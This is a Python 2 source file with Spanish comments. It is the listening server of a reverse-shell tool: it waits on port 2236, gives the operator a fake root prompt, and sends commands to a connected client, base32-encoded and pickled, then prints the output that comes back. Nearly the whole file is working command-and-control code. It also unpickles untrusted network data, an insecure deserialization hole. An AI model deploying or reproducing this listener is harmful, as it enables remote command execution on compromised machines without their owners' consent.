#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
Servido creado para correr en sistemas tipo Unix
"""

import socket
from base64 import b32encode as encode
from base64 import b32decode as decode
from cPickle import dumps, loads
from subprocess import Popen, PIPE, STDOUT
from re import split
 
B  = '\033[0m'  # blanco (normal)
R  = '\033[31m' # rojo
V  = '\033[32m' # verde
N  = '\033[33m' # naranja
A  = '\033[34m' # azul
C  = '\033[36m' # cyan
GR = '\033[37m' # gris
 
class Servidor(object):
    def __init__(self, host="0.0.0.0", port=2236):
        self.__iniciarServidor(host, port)
        self.__administrarClientes()
 
    def __iniciarServidor(self, host, port):
        print GR + "\n [*]" + C + " Iniciando servidor" + B
        try:
            self.servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.servidor.bind((host, port))
            self.servidor.listen(1)
            print GR + " [+]" + V + " Servidor iniciado en " + R + host + GR + ":" + R + str(port) + B
        except Exception as e:
            print R + " [!] " + N + str(e) + B
 
            used = "[Errno 98] Address already in use"
            if used in str(e):
                self.__liberarPuerto()
            else:
                self.__salir()
        except KeyboardInterrupt:
            self.__salir()
 
    def __liberarPuerto(self):
        p = Popen("lsof -i :2236", stdout=PIPE, stderr=STDOUT, shell=True)
        stdout, stderr = p.communicate()
 
        if stdout:
            stdout = split(r"\n", stdout)[1]
            app, pid = split(" +", stdout)[0], split(" +", stdout)[1]
 
        print GR + "\n [INFO]" + C + " Puerto utilizado por la siguiente aplicación: " + R + app + B
        pregunta = GR + "\n [?] Desea matar aplicación y robar puerto?[s/N] " + C
        respuesta = raw_input(pregunta)
 
        if respuesta.lower() == "s":
            print GR + "\n [*]" + C + " Matando aplicación: " + R + app + B
 
            cmd = "kill %s" % pid
            p = Popen(cmd, stdout=PIPE, stderr=STDOUT, shell=True)
            stdout, stderr = p.communicate()
 
            if stdout:
                print stdout
            if stderr:
                print stderr
 
            print GR + " [+]" + C + " OK" + B
 
            self.__init__()
        else:
            self.__salir()
 
    def __administrarClientes(self):
        try:
            print GR + "\n [*]" + C + " Esperando por nuevo cliente..." + B
            cliente = self.servidor.accept()
 
            self.cliente = cliente[0]
            self.addr = cliente[1]
 
            print GR + " [+]" + V + " Nuevo cliente conectando(" + R + self.addr[0] + V + ")\n" + B
        except Exception as e:
            print R + " [!] " + N + str(e) + B
            self.__salir()
        except KeyboardInterrupt:
            self.__salir()
 
        print GR + " [*]" + C + " Obteniendo shell\n" + B
        try:
            self.__shell()
        except Exception as e:
            print R + " [!]" + N + " ERROR: " + C + str(e) + B
            self.__salir()
        except KeyboardInterrupt:
            self.__salir()
 
    def __shell(self):
        #self.cliente.setblocking(0)
        self.cliente.settimeout(50)
 
        while True:
            cmd = raw_input(V + "root@root-PC:~$ " + C)
 
            if cmd == "salir":
                break
 
            # Encodeamos y pickleamos
            try:
                cmd = dumps(encode(cmd))
            except Exception as e:
                print R + " [!]" + N + " Error al codificar: " + C + str(e) + B
                continue
 
            # Enviamos
            try:
                self.cliente.send(cmd)
            except socket.error as e:
                print R + " [!]" + N + " Error al enviar: " + C + str(e) + B
                continue
 
            # Recibimos
            stdout, stderr = self.__recibir()
 
            if stdout:
                print stdout[:-1]
 
            if stderr is not None:
                print stderr
 
        self.cliente.send(dumps(encode("salir")))
        self.__salir()
 
    def __recibir(self):
        # Recibimos
        try:
            recv = self.cliente.recv(65565)
 
            parar = 1
            while not "&&&&" in recv:
                recv = recv + self.cliente.recv(65565)
 
            recv = recv.replace("&&&&", "")
 
        except socket.error as e:
            print R + " [!]" + N + " Error al recibir: " + C + str(e) + B
            return None, None
 
        # Depickleamos
        stdout, stderr = self.__depicklear(recv)
        return stdout, stderr
 
    def __depicklear(self, recv):
        # Depickleamos
        try:
            stdout, stderr = list(loads(recv))
 
        except Exception as e:
            print R + " [!]" + N + " Transferencia de data incompleta: " + C + str(e) + B
            # Eliminamos data problemática
            recv = self.cliente.recv(65565)
            return None, None
 
        # Decodeamos
        stdout, stderr = self.__decodear(stdout, stderr)
        return stdout, stderr
 
       
 
    def __decodear(self, stdout, stderr):
        # Decodeamos
        if stdout:
            try:
                stdout = decode(stdout)
                yield stdout
            except Exception as e:
                print R + " [!]" + N + "Error al decodificar stdout: " + C + str(e) + B
                yield None
        else:
            yield None
 
        if stderr:
            try:
                stderr = decode(stderr)
                yield stderr
            except Exception as e:
                print R + " [!]" + N + "Error al decodificar stderr: " + C + str(e) + B
                yield None
        else:
            yield None
 
    def __salir(self):
        print GR + "\n [+]" + C + " Saliendo..." + B
        try:
            self.cliente.close()
            self.servidor.close()
            exit()
        except Exception as e:
            error = "'Servidor' object has no attribute 'cliente'"
            if str(e) != error:
                print R + " [!]" + N + " ERROR: " + C + str(e) + B
            self.servidor.close()
            exit()
 
if __name__ == "__main__":
    s = Servidor()
